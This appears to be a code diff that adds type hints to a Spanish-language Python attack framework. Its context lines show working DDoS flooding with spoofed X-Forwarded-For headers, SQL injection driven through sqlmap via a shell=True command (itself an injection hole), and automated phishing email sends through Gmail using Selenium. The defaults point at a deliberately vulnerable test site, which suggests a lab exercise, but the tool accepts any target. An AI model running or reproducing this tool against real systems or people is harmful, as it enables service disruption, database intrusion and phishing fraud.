@@ -1,6 +1,7 @@
 import sys
 import random
 import logging
+from typing import List
 from abc import ABC, abstractmethod
 from scapy.all import IP, ICMP, send
 import multiprocessing
@@ -20,22 +21,22 @@ class AttackType(Enum):
     PHISHING = "Phishing"
 
 class Attack(ABC):
-    def __init__(self, attack_type: AttackType, targets: list):
+    def __init__(self, attack_type: AttackType, targets: list) -> None:
         self.__attack_type = attack_type
         self.__targets = targets
         self.status = "pending"
 
-    def get_attack_type(self):
+    def get_attack_type(self) -> AttackType:
         return self.__attack_type
 
-    def set_attack_type(self, attack_type):
+    def set_attack_type(self, attack_type) -> AttackType:
         if isinstance(attack_type, AttackType):
             self.__attack_type = attack_type
 
-    def get_targets(self):
+    def get_targets(self) -> List:
         return self.__targets
 
-    def set_targets(self, targets):
+    def set_targets(self, targets) -> List:
         if isinstance(targets, list):
             self.__targets = targets
 
@@ -52,7 +53,7 @@ class Attack(ABC):
         pass
 
 class DDoSAttack(Attack):
-    def __init__(self, dst_url: str, n_ips: int, n_msg: int, threads: int):
+    def __init__(self, dst_url: str, n_ips: int, n_msg: int, threads: int) -> None:
         super().__init__(AttackType.DDoS, [dst_url])
         self.dst_url = dst_url
         self.n_ips = n_ips
@@ -62,12 +63,12 @@ class DDoSAttack(Attack):
 
         self.get_random_ips()
 
-    def get_random_ips(self):
+    def get_random_ips(self) -> None:
         for _ in range(int(self.n_ips)):
             ip_gen = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
             self.ips.append(ip_gen)
 
-    def send_http_flood(self, origin_ip):
+    def send_http_flood(self, origin_ip) -> None:
         headers = {'X-Forwarded-For': origin_ip}
         for _ in range(int(self.n_msg)):
             try:
@@ -76,7 +77,7 @@ class DDoSAttack(Attack):
             except requests.RequestException as e:
                 print(f"Error sending request from {origin_ip}: {e}")
 
-    def start(self):
+    def start(self) -> None:
         self.status = "running"
         print(f"Iniciando ataque DDoS en {self.dst_url} con {self.n_ips} IPs a una tasa de {self.n_msg} mensajes por IP.")
     
@@ -92,50 +93,50 @@ class DDoSAttack(Attack):
         print(f"\nTotal: \nTiempo:\t{int(total_s)} segundos")
         print(f"Paquetes:\t{total_p} \nVelocidad:\t{int(ratio)} p/s")
 
-    def pause(self):
+    def pause(self) -> None:
         self.status = "paused"
         print("Ataque DDoS pausado.")
 
-    def stop(self):
+    def stop(self) -> None:
         self.status = "stopped"
         print("Ataque DDoS detenido.")
 
 class SQLInjectionAttack(Attack):
-    def __init__(self, target_url: str, payload: str):
+    def __init__(self, target_url: str, payload: str) -> None:
         super().__init__(AttackType.SQL_INJECTION, [target_url])
         self.__target_url = target_url
         self.__payload = payload
 
-    def start(self):
+    def start(self) -> None:
         self.status = "running"
         print(f"Iniciando SQL Injection en {self.__target_url} con el payload: {self.__payload}")
         self.run_sqlmap()
 
-    def run_sqlmap(self):
+    def run_sqlmap(self) -> None:
         command = f"sqlmap -u {self.__target_url} --data='{self.__payload}' --batch"
         subprocess.run(command, shell=True)
 
-    def pause(self):
+    def pause(self) -> None:
         self.status = "paused"
         print("Ataque SQL Injection pausado.")
 
-    def stop(self):
+    def stop(self) -> None:
         self.status = "stopped"
         print("Ataque SQL Injection detenido.")
 
 class PhishingAttack(Attack):
-    def __init__(self, target_emails: list, template: str):
+    def __init__(self, target_emails: list, template: str) -> None:
         super().__init__(AttackType.PHISHING, target_emails)
         self.__target_emails = target_emails
         self.__template = template
         self.driver = webdriver.Chrome()
 
-    def start(self):
+    def start(self) -> None:
         self.status = "running"
         print(f"Enviando correos de phishing a: {', '.join(self.__target_emails)} con la plantilla: {self.__template}")
         self.send_emails()
 
-    def send_emails(self):
+    def send_emails(self) -> None:
         for email in self.__target_emails:
             self.driver.get("https://mail.google.com/")
             time.sleep(2)
@@ -160,11 +161,11 @@ class PhishingAttack(Attack):
             send_button.click()
             time.sleep(2)
 
-    def pause(self):
+    def pause(self) -> None:
         self.status = "paused"
         print("Ataque de phishing pausado.")
 
-    def stop(self):
+    def stop(self) -> None:
         self.status = "stopped"
         self.driver.quit()
         print("Ataque de phishing detenido.")
@@ -179,6 +180,7 @@ if __name__ == '__main__':
         
         choice = input("Ingrese el número de su elección: ")
 
+        #? DDoS
         if choice == '1':
             target_url = input("Ingrese la URL de destino para el ataque DDoS (default: http://testphp.vulnweb.com): ") or "http://testphp.vulnweb.com"
 
@@ -187,6 +189,8 @@ if __name__ == '__main__':
             threads = input("Ingrese el número de hilos (default: 4): ") or 4
             ddos_attack = DDoSAttack(target_url, int(n_ips), int(n_msg), int(threads))
             ddos_attack.start()
+
+        #? 
         elif choice == '2':
             target_url = input("Ingrese la URL para el ataque SQL Injection (default: generic url): ") or "http://testphp.vulnweb.com/showimage.php?file=1"
 
